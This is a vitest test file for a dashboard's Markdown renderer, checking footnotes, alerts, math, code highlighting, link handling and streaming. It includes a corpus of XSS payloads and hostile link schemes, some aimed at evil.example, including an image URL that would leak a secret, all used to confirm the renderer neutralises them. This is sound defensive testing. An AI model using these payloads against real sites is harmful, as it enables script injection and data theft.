/** FIX-137: github.com additions, the D-227 exceptions, the XSS corpus and the streaming rules. */
import { cleanup, render, waitFor } from "@testing-library/react";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { classifyLink, deceptiveLabelHost, extrasFor, holdBackPartial, Markdown } from "@/components/ui/markdown";

afterEach(cleanup);

const show = (source: string, props: { breaks?: boolean; streaming?: boolean } = {}) => render(<Markdown source={source} {...props} />).container;

describe("github.com additions", () => {
  it("footnotes link both ways", () => {
    const c = show("Text[^1]\n\n[^1]: The note.");
    const ref = c.querySelector("a[data-footnote-ref]")!;
    const section = c.querySelector("section[data-footnotes]")!;
    expect(section.textContent).toContain("The note.");
    // The reference's target exists, and the back-link returns to the reference.
    expect(c.querySelector(`[id="${ref.getAttribute("href")!.slice(1)}"]`)).not.toBeNull();
    const back = section.querySelector("a[data-footnote-backref]")!;
    expect(c.querySelector(`[id="${back.getAttribute("href")!.slice(1)}"]`)).toBe(ref);
  });

  it.each(["NOTE", "TIP", "IMPORTANT", "WARNING", "CAUTION"])("alert %s", (kind) => {
    const c = show(`> [!${kind}]\n> Be careful here.`);
    const a = c.querySelector(`.md-alert-${kind.toLowerCase()}`)!;
    expect(a).not.toBeNull();
    expect(a.querySelector(".md-alert-title")!.textContent).toBe(kind[0] + kind.slice(1).toLowerCase());
    expect(a.textContent).toContain("Be careful here.");
    expect(a.textContent).not.toContain("[!");
    expect(c.querySelector("blockquote")).toBeNull();
  });

  it("a plain blockquote is not an alert", () => {
    const c = show("> [!BOGUS]\n> x\n\n> quoted");
    expect(c.querySelector(".md-alert")).toBeNull();
    expect(c.querySelectorAll("blockquote")).toHaveLength(2);
  });

  it("emoji shortcodes (lazy)", async () => {
    const c = show("Ship it :tada: and :rocket:");
    await waitFor(() => expect(c.textContent).toContain("🎉"));
    expect(c.textContent).toContain("🚀");
  });

  it("math: inline, block and ```math (lazy), KaTeX with trust off", async () => {
    const c = show("Inline $a^2+b^2=c^2$ here.\n\n$$\\int_0^1 x\\,dx$$\n\n```math\n\\sum_{i=1}^n i\n```\n\nBad \\href{javascript:alert(1)}{x}: $\\href{javascript:alert(1)}{click}$");
    await waitFor(() => expect(c.querySelectorAll(".katex").length).toBeGreaterThanOrEqual(3));
    expect(c.querySelector(".katex-display")).not.toBeNull();
    // trust: false → \href is not turned into a link
    expect([...c.querySelectorAll("a")].some((a) => (a.getAttribute("href") ?? "").startsWith("javascript"))).toBe(false);
  });

  it("a dollar amount is not a formula (github.com's rule)", async () => {
    const c = show("It costs $5 and then $10 more.");
    await new Promise((r) => setTimeout(r, 50));
    expect(c.querySelector(".katex")).toBeNull();
    expect(c.textContent).toContain("$5 and then $10");
  });

  it("highlights fenced code with a language label and a Copy button (lazy)", async () => {
    const c = show("```ts\nconst x: number = 1;\n```");
    expect(c.querySelector(".md-code-head")!.textContent).toContain("ts");
    expect(c.querySelector("button")!.textContent).toBe("Copy");
    await waitFor(() => expect(c.querySelector(".hljs-keyword")).not.toBeNull());
  });

  it("mermaid is shown as a code block (it cannot run under the dashboard CSP)", () => {
    const c = show("```mermaid\ngraph TD; A-->B;\n```");
    expect(c.querySelector("pre code")!.textContent).toContain("graph TD");
    expect(c.querySelector(".md-code-head")!.textContent).toContain("mermaid");
    expect(c.querySelector("svg")).toBeNull();
  });

  it("heading anchors: the id and a #fragment link agree", () => {
    const c = show("# Hello World\n\nSee [the heading](#hello-world).");
    const id = c.querySelector("h1")!.getAttribute("id")!;
    expect(id).toMatch(/hello-world$/);
    expect(c.querySelector("a")!.getAttribute("href")).toBe(`#${id}`);
    expect(c.querySelector(`[id="${id}"]`)).toBe(c.querySelector("h1"));
  });

  it("allowlisted raw HTML renders", () => {
    const c = show(
      "<details open><summary>More</summary>\n\nBody\n\n</details>\n\nPress <kbd>Ctrl</kbd>+<kbd>C</kbd>, H<sub>2</sub>O, x<sup>2</sup>, <mark>hi</mark><br>next\n\n<table><tr><th align=\"center\">A</th></tr><tr><td colspan=\"1\">1</td></tr></table>",
    );
    expect(c.querySelector("details[open] summary")!.textContent).toBe("More");
    expect(c.querySelectorAll("kbd")).toHaveLength(2);
    expect(c.querySelector("sub")).not.toBeNull();
    expect(c.querySelector("sup")).not.toBeNull();
    expect(c.querySelector("mark")).not.toBeNull();
    expect(c.querySelector("br")).not.toBeNull();
    expect((c.querySelector(".md-table table th") as HTMLElement).style.textAlign).toBe("center");
  });

  it("tables scroll in their own box; task lists are read-only; strikethrough and nested lists", () => {
    const c = show("| a | b |\n|:-:|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n  - nested\n\n~one~ ~~two~~");
    expect(c.querySelector(".md-table > table")).not.toBeNull();
    const boxes = c.querySelectorAll<HTMLInputElement>("input[type=checkbox]");
    expect(boxes).toHaveLength(2);
    expect([...boxes].every((b) => b.disabled)).toBe(true);
    expect(boxes[0].checked).toBe(true);
    expect(c.querySelectorAll("del")).toHaveLength(2);
    expect(c.querySelector("li li")!.textContent).toBe("nested");
  });

  it("a person's single newlines are line breaks (breaks)", () => {
    expect(show("a\nb", { breaks: true }).querySelector("br")).not.toBeNull();
    expect(show("a\nb").querySelector("br")).toBeNull();
  });
});

describe("D-227 exceptions", () => {
  it("other-origin images become links, never <img>; same-origin images are inline", () => {
    const c = show("![chart](https://evil.example/?d=secret)\n\n![att](/v1/attachments/1/raw)\n\n![own](" + window.location.origin + "/x.png)");
    const imgs = c.querySelectorAll("img");
    expect(imgs).toHaveLength(2);
    expect([...imgs].map((i) => i.getAttribute("src"))).toEqual(["/v1/attachments/1/raw", `${window.location.origin}/x.png`]);
    const a = [...c.querySelectorAll("a")].find((x) => x.textContent?.includes("🖼"))!;
    expect(a.getAttribute("href")).toBe("https://evil.example/?d=secret");
    expect(a.textContent).toContain("chart");
  });

  it("a data: or javascript: image is text, not a link or image", () => {
    const c = show("![x](data:image/png;base64,AAAA) ![y](javascript:alert(1))");
    expect(c.querySelector("img")).toBeNull();
    expect(c.querySelector("a")).toBeNull();
  });

  const hostile = [
    "[t](javascript:alert(1))",
    "[t](JaVaScRiPt:alert(1))",
    "[t](data:text/html,<script>alert(1)</script>)",
    "[t](vbscript:msgbox(1))",
    "[t][r]\n\n[r]: javascript:alert(1)",
    "<javascript:alert(1)>",
    '<a href="javascript:alert(1)">raw</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD4=">raw</a>',
    "x[^1]\n\n[^1]: [t](javascript:alert(1))",
    "[t](&#106;avascript:alert(1))",
    "[t](java\tscript:alert(1))",
  ];
  it.each(hostile)("scheme in every link form renders as text: %s", (src) => {
    const c = show(src);
    const bad = [...c.querySelectorAll("a")].filter((a) => /^\s*(javascript|data|vbscript)/i.test(a.getAttribute("href") ?? ""));
    expect(bad).toHaveLength(0);
    expect(c.innerHTML).not.toMatch(/href="\s*(javascript|data|vbscript):/i);
  });

  it("a URL-looking label that points elsewhere shows the real host; an ordinary label does not", () => {
    const lying = show("[https://cern.ch](https://evil.example/login)");
    expect(lying.querySelector("a")!.textContent).toContain("→ evil.example");
    expect(show("[cern.ch](https://evil.example)").textContent).toContain("→ evil.example");
    expect(show("[the docs](https://docs.example/a)").textContent).toBe("the docs");
    expect(show("[https://cern.ch/a](https://cern.ch/b)").textContent).not.toContain("→");
    expect(show("https://example.com/a").textContent).not.toContain("→");
    expect(show("[README.md](https://github.com/x/README.md)").textContent).not.toContain("→");
    expect(deceptiveLabelHost("www.example.com", "http://example.com/x")).toBeNull();
  });

  it("external links open in a new tab with noopener noreferrer nofollow and the full URL as the tooltip; same-origin stay", () => {
    const c = show("[ext](https://e.com/a?b=1)\n\n[own](/agents/1)\n\n[own2](" + window.location.origin + "/x)\n\n[mail](mailto:a@b.example)");
    const [ext, own, own2, mail] = [...c.querySelectorAll("a")];
    expect(ext.getAttribute("target")).toBe("_blank");
    expect(ext.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(ext.getAttribute("title")).toBe("https://e.com/a?b=1");
    expect(own.getAttribute("target")).toBeNull();
    expect(own2.getAttribute("target")).toBeNull();
    expect(mail.getAttribute("href")).toBe("mailto:a@b.example");
    expect(classifyLink("//evil.example/x").kind).toBe("external");
    expect(classifyLink("ftp://x.example").kind).toBe("blocked");
  });

  it("disallowed HTML is dropped and its text kept", () => {
    const c = show("a <script>alert(1)</script>b <iframe src=//evil></iframe>c <form><input name=x></form>d <style>p{}</style>e <svg><circle/></svg>f <object data=x>g</object>");
    expect(c.querySelector("script,iframe,form,style,svg,object")).toBeNull();
    expect(c.textContent).toContain("a ");
    expect(c.textContent).toContain("g");
    // (like github.com, a `<script>`'s own content is not shown at all)
    expect(c.textContent).not.toContain("alert(1)");
  });

  it("author class and style attributes are dropped", () => {
    const c = show('<div class="x" style="position:fixed;inset:0" id="a">hi</div> <span class="y" style="color:red">s</span>');
    const d = c.querySelector("div.md div, .md > div") as HTMLElement | null;
    expect(c.innerHTML).not.toContain("position:fixed");
    expect(c.innerHTML).not.toContain('class="x"');
    expect(c.innerHTML).not.toContain('class="y"');
    expect(c.innerHTML).not.toContain("color:red");
    expect(d?.id ?? "user-content-a").toBe("user-content-a");
  });
});

/** Payloads of the kinds behind public XSS advisories (raw HTML, event handlers, encodings, SVG, Mermaid and KaTeX). */
const XSS = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)><script>alert(1)</script></svg>",
  "<a href=\"javascript:alert(1)\" onclick=\"alert(1)\">x</a>",
  '<div style="background:url(javascript:alert(1))" class="x" onmouseover="alert(1)">hover</div>',
  "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
  "<details open ontoggle=alert(1)><summary>s</summary></details>",
  "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
  "<p onclick=alert(1)>x</p>",
  "<a href=\"&#x6A;avascript:alert(1)\">x</a>",
  "<input autofocus onfocus=alert(1)>",
  "<base href=\"//evil.example/\"><a href=\"x\">x</a>",
  "<meta http-equiv=refresh content=\"0;url=//evil.example\">",
  "<link rel=stylesheet href=//evil.example/x.css>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
  "<form action=//evil.example><button formaction=//evil.example>x</button></form>",
  "![x](//evil.example/a.png)",
  "![x](https://evil.example/a.png \"t\" onerror=alert(1))",
  "```mermaid\ngraph TD\nA[\"<img src=x onerror=alert(1)>\"]-->B\nclick A callback \"alert(1)\"\n```",
  "$\\href{javascript:alert(1)}{x}$ $\\url{javascript:alert(1)}$ $\\includegraphics{//evil.example/x}$ $\\htmlClass{a}{x}$ $\\htmlStyle{color:red}{x}$",
  "$$\\href{data:text/html,<script>alert(1)</script>}{x}$$",
  "[x](<javascript:alert(1)>) [y](  javascript:alert(1)) <JAVASCRIPT:alert(1)>",
  "<a href=\"\njavascript:alert(1)\">x</a>",
];

describe("XSS corpus renders inert", () => {
  it.each(XSS.map((p, i) => [i, p] as const))("payload %i", async (_i, payload) => {
    const c = show(payload);
    // Give the lazy math/highlight/emoji chunks time to apply before inspecting.
    await new Promise((r) => setTimeout(r, 120));
    expect(c.querySelector("script, iframe, object, embed, form, style, link, meta, base, noscript, svg, img[src^='http'], img[src^='//']")).toBeNull();
    for (const el of c.querySelectorAll("*")) {
      for (const a of el.attributes) {
        expect(a.name.startsWith("on"), `${el.tagName} ${a.name}`).toBe(false);
        if (a.name === "href" || a.name === "src" || a.name === "xlink:href") {
          expect(a.value.trim()).not.toMatch(/^(javascript|data|vbscript):/i);
          if (a.name === "src") expect(a.value.startsWith("//") || /^https?:/i.test(a.value)).toBe(false);
        }
      }
    }
    // `style` is only ever our own (KaTeX sizing, a table cell's alignment), never author input.
    expect([...c.querySelectorAll("[style]")].every((e) => e.closest(".katex") !== null || ["TD", "TH"].includes(e.tagName))).toBe(true);
    expect([...c.querySelectorAll("a[target]")].every((a) => a.getAttribute("rel") === "noopener noreferrer nofollow")).toBe(true);
  });
});

describe("streaming", () => {
  it("an unclosed fence renders as a code block until it closes", () => {
    const c = show("Before\n\n```js\nconst a = 1;\nconst b");
    expect(c.querySelector("pre code")!.textContent).toContain("const b");
  });

  it("an unfinished table row is held back", () => {
    expect(holdBackPartial("| a | b |\n|---|---|\n| 1 | 2 |\n| 3 |")).toBe("| a | b |\n|---|---|\n| 1 | 2 |\n");
    // A row appears once its newline has arrived; the finished message (not streaming) shows every row.
    expect(holdBackPartial("| a | b |\n|---|---|\n| 1 | 2 |\n")).toBe("| a | b |\n|---|---|\n| 1 | 2 |\n");
    expect(holdBackPartial("| a | b |\n|---|---|\n| 1 | 2 |")).toBe("| a | b |\n|---|---|\n");
    expect(show("| a | b |\n|---|---|\n| 1 | 2 |").querySelectorAll("tbody tr")).toHaveLength(1);
    expect(holdBackPartial("text with | pipe")).toBe("text with | pipe");
    expect(holdBackPartial("| lone")).toBe("| lone");
    const c = show("| a | b |\n|---|---|\n| 1 | 2 |\n| 3 |", { streaming: true });
    expect(c.querySelectorAll("tbody tr")).toHaveLength(1);
  });

  it("lazy extras are only requested when needed", () => {
    expect(extrasFor("plain text")).toEqual([]);
    expect(extrasFor("a $b$ c")).toEqual(["math"]);
    expect(extrasFor("```math\nx\n```")).toContain("math");
    expect(extrasFor("```rust\nfn x(){}\n```")).toEqual(["highlight"]);
    expect(extrasFor("hi :wave:")).toEqual(["emoji"]);
  });
});

describe("renderer safety guard", () => {
  it("no dangerouslySetInnerHTML (or innerHTML assignment) anywhere in src but the theme script (I-41)", () => {
    const hits: string[] = [];
    const walk = (dir: string) => {
      for (const name of readdirSync(dir)) {
        const p = join(dir, name);
        if (statSync(p).isDirectory()) walk(p);
        else if (/\.(tsx?|jsx?)$/.test(name) && /dangerouslySetInnerHTML|\.innerHTML\s*=/.test(readFileSync(p, "utf8"))) hits.push(p);
      }
    };
    walk(join(__dirname, "..", "src"));
    expect(hits.map((h) => h.replace(/.*\/src\//, ""))).toEqual(["app/layout.tsx"]);
  });
});
